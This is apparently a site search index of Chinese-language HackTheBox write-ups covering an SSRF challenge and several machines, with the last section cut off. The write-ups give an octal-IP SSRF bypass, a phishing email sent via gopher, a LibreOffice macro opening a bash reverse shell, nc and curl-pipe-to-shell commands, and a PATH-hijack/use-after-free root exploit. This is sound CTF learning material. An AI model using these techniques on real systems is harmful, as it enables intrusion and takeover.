{"config": {"lang": ["en"], "separator": "[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+", "pipeline": ["stemmer"]}, "docs": [{"location": "", "title": "Home", "text": "<p>\u770b\u4e0d\u60ef\u522b\u4eba\u7684 Write-up\uff0c\u90a3\u5c31\u53ea\u597d\u81ea\u5df1\u5199\u4e86~</p> <ul> <li> <p> Hackthebox</p> </li> <li> <p> Tryhackme</p> </li> </ul>"}, {"location": "HackTheBox/", "title": "Home", "text": ""}, {"location": "HackTheBox/#machines", "title": "Machines", "text": ""}, {"location": "HackTheBox/#challenges", "title": "Challenges", "text": ""}, {"location": "HackTheBox/#misc", "title": "Misc", "text": ""}, {"location": "HackTheBox/#web", "title": "Web", "text": ""}, {"location": "HackTheBox/#crypto", "title": "Crypto", "text": ""}, {"location": "HackTheBox/#reverse", "title": "Reverse", "text": ""}, {"location": "HackTheBox/#pwn", "title": "Pwn", "text": ""}, {"location": "HackTheBox/#sherlocks", "title": "Sherlocks", "text": ""}, {"location": "HackTheBox/Challenges/Crypto/VeryEasy-BabyEncryption/", "title": "Very Easy - BabyEncryption", "text": ""}, {"location": "HackTheBox/Challenges/Web/Easy-ProxyAsAService/", "title": "Easy-ProxyAsAService", "text": "<p>Experience the freedom of the web with ProxyAsAService. Because online privacy and access should be for everyone, everywhere.</p> <p>ProxyAsAService.zip</p> <ul> <li>web_proxyasaservice</li> <li>challenge/<ul> <li>application/</li> <li>blueprints/<ul> <li>routes.py</li> </ul> </li> <li>app.py</li> <li>config.py</li> <li>util.py</li> <li>run.py</li> </ul> </li> <li>config/<ul> <li>supervisord.conf</li> </ul> </li> <li>build-docker.sh</li> <li>Dockerfile</li> </ul> <p>\u7b80\u5355\u8fc7\u4e00\u4e0b\u4ee3\u7801\uff0c\u662f\u4e00\u4e2a Python flask \u6846\u67b6\u7684 HTTP \u4ee3\u7406</p>"}, {"location": "HackTheBox/Challenges/Web/Easy-ProxyAsAService/#routespy", "title": "routes.py", "text": "<ul> <li>flag \u83b7\u53d6\u65b9\u6cd5</li> </ul> <pre><code>@debug.route('/environment', methods=['GET'])\n@is_from_localhost\ndef debug_environment():\n    environment_info = {\n        'Environment variables': dict(os.environ),\n        'Request headers': dict(request.headers)\n    }\n\n    return jsonify(environment_info)\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u83b7\u53d6 flag \u7684\u65b9\u5f0f\u4e3a\u672c\u5730\u8bbf\u95ee <code>http://127.0.0.1/debug/environment</code></p> <ul> <li>\u6709\u6f0f\u6d1e\u7684\u8def\u7531</li> </ul> <pre><code>SITE_NAME = 'reddit.com'\n\n@proxy_api.route('/', methods=['GET', 'POST'])\ndef proxy():\n    url = request.args.get('url')\n    ...\n    target_url = f'http://{SITE_NAME}{url}'\n    response, headers = proxy_req(target_url)\n</code></pre> <p>\u83b7\u53d6 url \u53c2\u6570\uff0c\u62fc\u63a5\u6210<code>https://reddit.com{url}</code> \u4f20\u7ed9 proxy_req</p>"}, {"location": "HackTheBox/Challenges/Web/Easy-ProxyAsAService/#utilpy", "title": "util.py", "text": "<ul> <li>\u4ee3\u7406\u8bf7\u6c42</li> </ul> <pre><code>def proxy_req(url):\n    ...\n    response = requests.request(\n        method,\n        url,\n        headers=headers,\n        data=data,\n        verify=False\n    )\n    ...\n    if not is_safe_url(url) or not is_safe_url(response.url):\n        print('[+]', url, response.url)\n        return abort(403)\n    return response, headers\n</code></pre> <p>proxy_req \u51fd\u6570\u8bf7\u6c42 url\uff0c\u56e0\u6b64\u53ef\u4ee5\u6784\u9020 SSRF</p> <pre><code>url = @127.0.0.1:1337/debug/environment\n</code></pre> <p></p> <p>\u53d1\u73b0\u88ab\u8fc7\u6ee4\u4e86</p> <ul> <li>\u8fc7\u6ee4\u51fd\u6570</li> </ul> <pre><code>RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']\ndef is_safe_url(url):\n    for restricted_url in RESTRICTED_URLS:\n        if restricted_url in url:\n            return False\n    return True\n</code></pre> <p>\u5c1d\u8bd5\u7ed5\u8fc7\uff0c\u53d1\u73b0 8 \u8fdb\u5236\u53ef\u4ee5</p> <pre><code>url = @0177.0.0.1:1337/debug/environment\n</code></pre> <p>https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/#bypass-using-octal-ip</p>"}, {"location": "HackTheBox/Challenges/Web/Easy-ProxyAsAService/#get-flag", "title": "Get Flag", "text": "<pre><code>curl http://[ip]:[port]/?url=@0177.0.0.1:1337/debug/environment\n</code></pre> <ul> <li>\u672c\u5730\u6d4b\u8bd5</li> </ul>"}, {"location": "HackTheBox/Machines/Appsanity/", "title": "Appsanity", "text": ""}, {"location": "HackTheBox/Machines/Appsanity/#enumeration", "title": "Enumeration", "text": "<ul> <li>Nmap recon</li> </ul> <pre><code># IP='10.10.11.238'; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep '/tcp\\|/udp' | awk -F '/' '{print $1}' | tr '\\n' ',') $IP -oN nmap.txt\nNmap scan report for 10.10.11.238\nHost is up (0.21s latency).\n\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    Microsoft IIS httpd 10.0\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: Did not follow redirect to https://meddigi.htb/\n443/tcp  open  https?\n5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n|_http-title: Not Found\n|_http-server-header: Microsoft-HTTPAPI/2.0\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nOS fingerprint not ideal because: Missing a closed TCP port so results incomplete\nNo OS matches for host\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Oct 31 16:24:15 2023 -- 1 IP address (1 host up) scanned in 43.10 seconds\n</code></pre> <ul> <li>ffuf brute vhost</li> </ul> <pre><code># ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-spanish.txt -u https://meddigi.htb -H \"Host: FUZZ.meddigi.htb\" -c\n</code></pre> <p>\u4f7f\u7528 cookie \u7ed5\u8fc7\u767b\u5f55</p> <p></p> <p>\u7ecf\u8fc7\u5c1d\u8bd5\u9700\u8981\u5c06 acctype \u6539\u4e3a 2 (1\u4e0d\u884c\uff0c0\u9519\u8bef)</p> <p></p> <p>\u6210\u529f\u767b\u5f55\uff0c\u53d1\u73b0 PDF \u4e0a\u4f20\u9875\u9762</p> <p></p> <p>\u4f46\u662f\u6ca1\u627e\u5230\u6587\u4ef6\u8bfb\u53d6\u7684\u5730\u65b9\uff0c\u51c6\u5907 fuzz</p> <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt   -u https://portal.meddigi.htb/FUZZ -c -fc 302\n</code></pre> <p></p> <p>\u6362\u4e00\u4e2a\u8def\u5f84\u518d\u6b21\u5c1d\u8bd5</p> <pre><code>ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt   -u https://portal.meddigi.htb/ExamReport/FUZZ -c -fc 302\n</code></pre> <p></p> <pre><code>evil-winrm -i 10.10.11.238 -u devdoc -p '1g0tTh3R3m3dy!!'\ncd 'C:\\Program Files\\ReportManagement\\Libraries\\'\nupload /mnt/d/5.WorkSpace/9.KaliLinux/HTB-Machines/Hard-Appsanity/externalupload.dll\nupload /mnt/d/5.WorkSpace/9.KaliLinux/HTB-Machines/Hard-Appsanity/nc64.exe\n./nc64.exe 127.0.0.1 100\necho 'upload externalupload.dll' |  ./nc64.exe 127.0.0.1 100\n\ncmd /c \"C:\\Program Files\\ReportManagement\\Libraries\\nc64.exe\" 10.10.16.8 2233 -e powershell\n\n$username = 'Administrator'\n$password = 'Password in plain text'\n$securePassword = ConvertTo-SecureString $password -AsPlainText -Force\n$credential = New-Object System.Management.Automation.PSCredential ($username, $securePassword)\n\nInvoke-Command -ComputerName localhost -Credential $credential -ScriptBlock { type c:\\users\\administrator\\desktop\\root.txt}\n</code></pre>"}, {"location": "HackTheBox/Machines/Codify/", "title": "Codify", "text": ""}, {"location": "HackTheBox/Machines/Codify/#enumeration", "title": "Enumeration", "text": "<ul> <li>Nmap recon</li> </ul> <pre><code>    # IP='10.10.11.238'; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep '/tcp\\|/udp' | awk -F '/' '{print $1}' | tr '\\n' ',') $IP -oN nmap.txt\nNmap scan report for 10.10.11.239\nHost is up (0.80s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)\n|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)\n80/tcp   open  http    Apache httpd 2.4.52\n|_http-title: Did not follow redirect to http://codify.htb/\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n3000/tcp open  ppp?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HackTheBox/Machines/Download/", "title": "Download", "text": ""}, {"location": "HackTheBox/Machines/Download/#enumeration", "title": "Enumeration", "text": "<ul> <li>Nmap recon</li> </ul> <pre><code># IP='10.10.11.238'; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep '/tcp\\|/udp' | awk -F '/' '{print $1}' | tr '\\n' ',') $IP -oN nmap.txt\nNmap scan report for 10.10.11.226\nHost is up (0.15s latency).\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)\n|   256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)\n|_  256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://download.htb\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/", "title": "Hard - Gofer", "text": ""}, {"location": "HackTheBox/Machines/Gofer/#enumeration", "title": "Enumeration", "text": ""}, {"location": "HackTheBox/Machines/Gofer/#nmap", "title": "Nmap", "text": "<pre><code># IP='10.10.11.225'; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep '/tcp\\|/udp' | awk -F '/' '{print $1}' | tr '\\n' ',') $IP -oN nmap.txt\n\nNmap scan report for 10.10.11.225\nHost is up (0.22s latency).\n\nPORT    STATE SERVICE     VERSION\n22/tcp  open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey:\n|   3072 aa25826eb804b6a9a95e1a91f09451dd (RSA)\n|   256 1821baa7dce44f60d781039a5dc2e596 (ECDSA)\n|_  256 a42d0d45132a9e7f867af6f778bc42d9 (ED25519)\n25/tcp  filtered smtp\n80/tcp  open  http        Apache httpd 2.4.56\n|_http-server-header: Apache/2.4.56 (Debian)\n|_http-title: Did not follow redirect to http://gofer.htb/\n139/tcp open  netbios-ssn Samba smbd 4.6.2\n445/tcp open  netbios-ssn Samba smbd 4.6.2\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host: gofer.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_clock-skew: -1s\n| smb2-security-mode:\n|   311:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2023-10-28T16:10:54\n|_  start_date: N/A\n|_nbstat: NetBIOS name: GOFER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/#smb", "title": "SMB", "text": "<pre><code>cme smb 10.10.11.225 -u guest -p ''  --shares\n</code></pre> <pre><code>smbclient \\\\\\\\10.10.11.225\\\\shares -U guest\n</code></pre> <ul> <li>mail</li> </ul> <pre><code>From jdavis@gofer.htb  Fri Oct 28 20:29:30 2022\nReturn-Path: &lt;jdavis@gofer.htb&gt;\nX-Original-To: tbuckley@gofer.htb\nDelivered-To: tbuckley@gofer.htb\nReceived: from gofer.htb (localhost [127.0.0.1])\n        by gofer.htb (Postfix) with SMTP id C8F7461827\n        for &lt;tbuckley@gofer.htb&gt;; Fri, 28 Oct 2022 20:28:43 +0100 (BST)\nSubject:Important to read!\nMessage-Id: &lt;20221028192857.C8F7461827@gofer.htb&gt;\nDate: Fri, 28 Oct 2022 20:28:43 +0100 (BST)\nFrom: jdavis@gofer.htb\n\nHello guys,\n\nOur dear Jocelyn received another phishing attempt last week and his habit of clicking on links without paying much attention may be problematic one day. That's why from now on, I've decided that important documents will only be sent internally, by mail, which should greatly limit the risks. If possible, use an .odt format, as documents saved in Office Word are not always well interpreted by Libreoffice.\n\nPS: Last thing for Tom; I know you're working on our web proxy but if you could restrict access, it will be more secure until you have finished it. It seems to me that it should be possible to do so via &lt;Limit&gt;\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/#subdomain", "title": "Subdomain", "text": "<pre><code># ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://gofer.htb -H \"Host: FUZZ.gofer.htb\" -c -mc all --fw 20\n\nproxy                   [Status: 401, Size: 462, Words: 42, Lines: 15, Duration: 248ms]\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/#http", "title": "HTTP", "text": "<ul> <li>gofer.htb</li> </ul> <p>\u7ed3\u5408\u90ae\u7bb1\u4e2d\u7528\u6237\u540d\u7684\u547d\u540d\u65b9\u5f0f <code>jdavis tbuckley</code> \u731c\u6d4b\u6240\u6709\u4eba\u7684\u7528\u6237\u540d</p> <pre><code>jdavis      Chief Executive Officer\njhudson     Product Manager\ntbuckley    CTO\nablake      Accountant\n</code></pre> <ul> <li>\u76ee\u5f55\u679a\u4e3e</li> </ul> <pre><code># feroxbuster -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -m GET,POST,PUT,OPTIONS,DELETE,PATCH -s 200 -u http://gofer.htb/\n\nNo High Value Path\n</code></pre> <ul> <li>proxy.gofer.htb</li> </ul> <pre><code># feroxbuster -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -m GET,POST,PUT,OPTIONS,DELETE,PATCH -s 200 -u http://proxy.gofer.htb/\n...\n200     POST        2l       10w       81c http://proxy.gofer.htb/index.php\n200      PUT        2l       10w       81c http://proxy.gofer.htb/index.php\n200  OPTIONS        2l       10w       81c http://proxy.gofer.htb/index.php\n200   DELETE        2l       10w       81c http://proxy.gofer.htb/index.php\n200    PATCH        2l       10w       81c http://proxy.gofer.htb/index.php\n...\n</code></pre> <p></p> <p>\u8bf7\u6c42\u53c2\u6570 <code>url=localhost</code> \u5b58\u5728\u9ed1\u540d\u5355</p> <p></p> <p>\u8bf7\u6c42 <code>url=127.0.0.1</code> \u54cd\u5e94 gofer.htb \u9875\u9762</p> <p></p> <ul> <li>\u5c1d\u8bd5\u5176\u4ed6 SSRF</li> </ul> <p>https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/</p> <p>\u5bf9\u4e8e\u8bf7\u6c42\u7684\u534f\u8bae\u4e5f\u5b58\u5728\u9ed1\u540d\u5355</p> <p></p> <p>\u5c1d\u8bd5\u540e\u53d1\u73b0 gopher \u534f\u8bae\u53ef\u4ee5\uff0c\u4f46\u662f\u5bf9\u4e8e\u5730\u5740\u6709\u9ed1\u540d\u5355</p> <p></p> <p>\u5c1d\u8bd5\u7ed5\u8fc7\uff0c\u53ef\u4ee5\u7528 0 \u4ee3\u66ff 127.0.0.1 \u540c\u65f6\u53ef\u4ee5\u8bbf\u95ee\u5176\u4ed6\u7aef\u53e3</p> <p></p>"}, {"location": "HackTheBox/Machines/Gofer/#shell-as-jhudson", "title": "Shell as jhudson", "text": "<p>\u60f3\u5230 nmap \u626b\u63cf\u5230 25 \u7aef\u53e3\u88ab\u8fc7\u6ee4\uff0c\u540c\u65f6 smb \u670d\u52a1\u7684\u90ae\u4ef6\u63d0\u793a\u53ef\u4ee5\u4f7f\u7528 .odt \u8fdb\u884c\u7f51\u7edc\u9493\u9c7c\uff08\u4f1a\u6709\u4eba\u70b9\u51fb\u94fe\u63a5\uff09</p> <ul> <li> <p>\u6784\u9020\u6076\u610f\u90ae\u4ef6\u53d1\u7ed9 <code>Product Manager</code> \u6216\u8005 <code>Accountant</code></p> </li> <li> <p>'https://swisskyrepo.github.io/PayloadsAllTheThingsWeb/Server%20Side%20Request%20Forgery/</p> </li> </ul> <pre><code>_HELO 0\nMAIL FROM:&lt;jdavis@gofer.htbb&gt;\nRCPT TO:&lt;jhudson@gofer.htb&gt;\nDATA\nFrom: &lt;jdavis@gofer.htb&gt;\nTo: &lt;jhudson@gofer.htb&gt;\nDate: Tue, 15 Sep 2017 17:20:26 -0400\nSubject: AH AH AH\n\nhttp://10.10.16.47/good.odt\n.\nQUIT\n</code></pre> <p>\u9996\u5148\u542f\u52a8 HTTP \u670d\u52a1\uff0c\u67e5\u770b\u662f\u5426\u80fd\u6536\u5230\u8bf7\u6c42</p> <p></p> <ul> <li>\u90ae\u4ef6\u4e2d\u8bf4\u660e\u516c\u53f8\u4f7f\u7528 Libreoffice\uff0c\u6781\u6709\u53ef\u80fd\u4f1a\u81ea\u52a8\u6253\u5f00\uff0c\u56e0\u6b64\u6784\u9020\u6076\u610f .odt \u6587\u4ef6</li> <li>Libreoffice\uff1a\u65b0\u5efa\u6587\u4ef6 -&gt; \u4fdd\u5b58\u4e3a good.odt -&gt; \u5de5\u5177 -&gt; \u5b8f -&gt; \u7f16\u8f91\u5b8f -&gt; \u5de5\u5177 -&gt; \u9009\u62e9\u5b8f -&gt; \u9009\u4e2d\u6587\u4ef6 -&gt; New</li> <li>\u5de5\u5177 -&gt; \u7ba1\u7406\u5b8f -&gt; Basic \u8bed\u8a00 -&gt; \u9009\u62e9\u5b8f -&gt; \u6ce8\u518c Assign -&gt; Events -&gt; \u9009\u4e2d Open Document -&gt; \u6dfb\u52a0\u5b8f macro... -&gt; \u9009\u62e9\u6076\u610f\u5b8f -&gt; \u8bbe\u7f6e\u4fdd\u5b58\u5230\u6587\u4ef6\u4e2d -&gt; OK -&gt; Run</li> </ul> <pre><code>REM  *****  BASIC  *****\n\nSub Main\n    Shell(\"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.47/2233 0&gt;&amp;1'\")\nEnd Sub\n</code></pre> <p></p> <p></p> <p></p>"}, {"location": "HackTheBox/Machines/Gofer/#get-usertxt", "title": "Get User.txt", "text": "<pre><code>jhudson@gofer:~$ cat user.txt\ne07152e2976495f478ee9a8d0d356ea5\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/#linpeassh", "title": "linpeas.sh", "text": "<pre><code>[Attack]# nc -lvvnp 2233 | tee results/linpeas.log\n[Target]# curl http://10.10.16.47/linpeas.sh | sh &gt; /dev/tcp/10.10.16.47/2233 2&gt;1\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/#shell-as-tbuckley", "title": "Shell as tbuckley", "text": "<p>\u53d1\u73b0 Capabilities</p> <p></p> <p>https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities</p> <p>\u5c1d\u8bd5\u4f7f\u7528 tcpdump \u63d0\u6743</p> <ul> <li>/tmp/shell</li> </ul> <pre><code>#!/bin/bash\n/bin/bash -p\n</code></pre> <pre><code>tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell\n</code></pre> <p></p> <p>\u547d\u4ee4\u6267\u884c\u63d0\u6743\u5931\u8d25\uff0c\u60f3\u5230 proxy.gofer.htb \u662f\u4e00\u4e2a\u4ee3\u7406\u670d\u52a1\uff0c\u53ef\u80fd\u4f1a\u6709\u5176\u4ed6\u7528\u6237\u4f7f\u7528\uff0c\u56e0\u6b64\u76d1\u542c 80 \u7aef\u53e3\uff0c\u770b\u770b\u662f\u5426\u6709\u6d41\u91cf\u51fa\u73b0\u3002</p> <p></p> <p>\u53d1\u73b0\u4e00\u4e2a\u8ba4\u8bc1\uff0c\u89e3\u7801\u53d1\u73b0\u662f tbuckley \u7684\u51ed\u636e</p> <p></p> <p>tbuckley \u5728 dev \u7ec4\uff0c\u6709\u4e00\u4e2a SUID \u6743\u9650\u7684\u53ef\u6267\u884c\u7a0b\u5e8f</p> <p></p>"}, {"location": "HackTheBox/Machines/Gofer/#shell-as-root", "title": "Shell as root", "text": "<p>\u7b80\u5355\u5206\u6790\u4e00\u4e0b notes</p> <p></p> <pre><code>int __cdecl main(int argc, const char **argv, const char **envp)\n{\n  char *v3; // rax\n  int v5; // [rsp+Ch] [rbp-14h] BYREF\n  void *ptr; // [rsp+10h] [rbp-10h]\n  void *s; // [rsp+18h] [rbp-8h]\n\n  v5 = 0;\n  s = 0LL;\n  ptr = 0LL;\n  while ( 1 )\n  {\n    puts(\n      \"========================================\\n\"\n      \"1) Create an user and choose an username\\n\"\n      \"2) Show user information\\n\"\n      \"3) Delete an user\\n\"\n      \"4) Write a note\\n\"\n      \"5) Show a note\\n\"\n      \"6) Save a note (not yet implemented)\\n\"\n      \"7) Delete a note\\n\"\n      \"8) Backup notes\\n\"\n      \"9) Quit\\n\"\n      \"========================================\\n\"\n      \"\\n\");\n    printf(\"Your choice: \");\n    __isoc99_scanf(\"%d\", &amp;v5);\n    puts(&amp;byte_212E);\n    switch ( v5 )\n    {\n      case 1:\n        s = malloc(0x28uLL);\n        if ( !s )\n          exit(-1);\n        memset(s, 0, 0x18uLL);\n        memset((char *)s + 24, 0, 0x10uLL);\n        if ( getuid() )\n        {\n          *((_DWORD *)s + 6) = 1919251317;\n        }\n        else\n        {\n          v3 = (char *)s + 24;\n          *((_DWORD *)s + 6) = 1768776801;\n          v3[4] = 110;\n        }\n        printf(\"Choose an username: \");\n        __isoc99_scanf(\"%23s\", s);\n        puts(&amp;byte_212E);\n        continue;\n      case 2:\n        if ( !s )\n          goto LABEL_11;\n        printf(\"\\nUsername: %s\\n\", (const char *)s);\n        printf(\"Role: %s\\n\\n\", (const char *)s + 24);\n        break;\n      case 3:\n        if ( s )\n          free(s);\n        continue;\n      case 4:\n        ptr = malloc(0x28uLL);\n        memset(ptr, 0, 0x28uLL);\n        if ( !ptr )\n          exit(-1);\n        puts(\"Write your note:\");\n        __isoc99_scanf(\"%39s\", ptr);\n        continue;\n      case 5:\n        printf(\"Note: %s\\n\\n\", (const char *)ptr);\n        continue;\n      case 6:\n        puts(\"Coming soon!\\n\");\n        continue;\n      case 7:\n        if ( ptr )\n        {\n          free(ptr);\n          ptr = 0LL;\n        }\n        continue;\n      case 8:\n        if ( s )\n        {\n          if ( !strcmp((const char *)s + 24, \"admin\") )\n          {\n            puts(\"Access granted!\");\n            setuid(0);\n            setgid(0);\n            system(\"tar -czvf /root/backups/backup_notes.tar.gz /opt/notes\");\n          }\n          else\n          {\n            puts(\"Access denied: you don't have the admin role!\\n\");\n          }\n        }\n        else\n        {\nLABEL_11:\n          puts(\"First create an user!\\n\");\n        }\n        break;\n      default:\n        exit(0);\n    }\n  }\n}\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u5728 <code>case 8</code> \u4e2d\u8bbe\u7f6e\u4e86 uid \u4e3a 0 \u540e\u8c03\u7528 tar\uff0c\u56e0\u6b64\u53ef\u4ee5\u52ab\u6301\u73af\u5883\u53d8\u91cf</p> <p>\u82e5\u8981\u6b63\u5e38\u6267\u884c\u5230 system \u90e8\u5206\uff0c\u9700\u8981 s[24:] == admin \u4fee\u6539 s \u53d8\u91cf\u7684\u4f4d\u7f6e\u4e3a <code>case 1</code></p> <p>\u56e0\u6b64\u6784\u9020 <code>username = 12345678901234567890123admin</code></p> <pre><code>tbuckley@gofer:~$ /usr/local/bin/notes\n========================================\n1) Create an user and choose an username\n2) Show user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not yet implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n========================================\n\n\nYour choice: 1\n\nChoose an username: 12345678901234567890123admin\n\n========================================\n1) Create an user and choose an username\n2) Show user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not yet implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n========================================\n\n\nYour choice: 8\n\nAccess denied: you don't have the admin role!\n</code></pre> <p>\u5931\u8d25\u4e86\uff0c\u518d\u6b21\u5206\u6790\uff0c\u53d1\u73b0 <code>case 1</code> \u4e2d\u4ec5\u4ec5\u7ed9 s \u5206\u914d\u4e86 24 \u5b57\u8282\uff0c\u8fdb\u4e00\u6b65\u89c2\u5bdf\u53d1\u73b0 <code>case 4</code>\u4f1a\u7533\u8bf7 40 \u4e2a\u5b57\u8282\uff0c\u540c\u65f6 <code>case 3</code> \u4f1a\u91ca\u653e\u6389 s \u53d8\u91cf\u7684\u5185\u5b58\uff0c\u56e0\u6b64\u53ef\u4ee5\u5148\u91ca\u653e s \u5185\u5b58\uff0c\u518d\u5728 <code>case 4</code>\u7533\u8bf7\u65b0\u53d8\u91cf\u7684\u5185\u5b58\uff0c\u5373\u53ef\u5728\u539f\u5185\u5b58\u8303\u56f4\u5185\u5199\u5165\u6570\u636e\uff0c\u6b64\u65f6\u7684 <code>case 8</code> \u4e5f\u53ef\u4ee5\u83b7\u53d6\u5230\u53d8\u91cf s \u5728\u91ca\u653e\u4e4b\u524d\u7684\u5185\u5b58\u533a\u57df\uff0c\u653b\u51fb\u6d41\u7a0b\uff1a</p> <ol> <li>\u7f16\u8f91 <code>/tmp/tmp/tar</code></li> </ol> <pre><code>#!/bin/bash\n/bin/bash -p\n</code></pre> <ol> <li>\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\u53ca\u6743\u9650</li> </ol> <pre><code>chmod +x /tmp/tmp/tar\nexport PATH=/tmp/tmp:$PATH\n</code></pre> <ol> <li>\u6267\u884c notes</li> </ol> <pre><code>/usr/local/bin/notes\n# \u9009\u62e9 1\n# \u8f93\u5165 24 \u4f4d\u5783\u573e\u6570\u636e + admin\n123456789012345678901234admin\n# \u9009\u62e9 2 \u67e5\u770b role \u662f\u5426\u4e3a admin\n# \u9009\u62e9 3\n# \u9009\u62e9 4\n# \u8f93\u5165 24 \u4f4d\u5783\u573e\u6570\u636e + admin\n123456789012345678901234admin\n# \u9009\u62e9 2 \u67e5\u770b role \u662f\u5426\u4e3a admin\n# \u9009\u62e9 8\n</code></pre>"}, {"location": "HackTheBox/Machines/Gofer/#get-roottxt", "title": "Get root.txt", "text": "<pre><code>========================================\n1) Create an user and choose an username\n2) Show user information\n3) Delete an user\n4) Write a note\n5) Show a note\n6) Save a note (not yet implemented)\n7) Delete a note\n8) Backup notes\n9) Quit\n========================================\nYour choice: 1\n\nChoose an username: 123456789012345678901234admin\n========================================\nYour choice: 2\n\nUsername: 12345678901234567890123\nRole: user\n========================================\nYour choice: 3\n========================================\nYour choice: 4\n\nWrite your note:\n123456789012345678901234admin\n========================================\nYour choice: 2\n\nUsername: 123456789012345678901234admin\nRole: admin\n========================================\nYour choice: 8\n\nAccess granted!\n/bin/bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)\nbash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)\nroot@gofer:~#\n</code></pre>"}, {"location": "HackTheBox/Machines/Manager/", "title": "Manager", "text": ""}, {"location": "HackTheBox/Machines/Manager/#enumeration", "title": "Enumeration", "text": "<pre><code># IP='10.10.11.236'; nmap -sC -sV -O -p$(nmap -sS -p- --min-rate 1000 -T4 $IP | grep '/tcp\\|/udp' | awk -F '/' '{print $1}' | tr '\\n' ',') $IP -oN nmap.txt\n\nNmap scan report for 10.10.11.236\nHost is up (0.13s latency).\n\nPORT      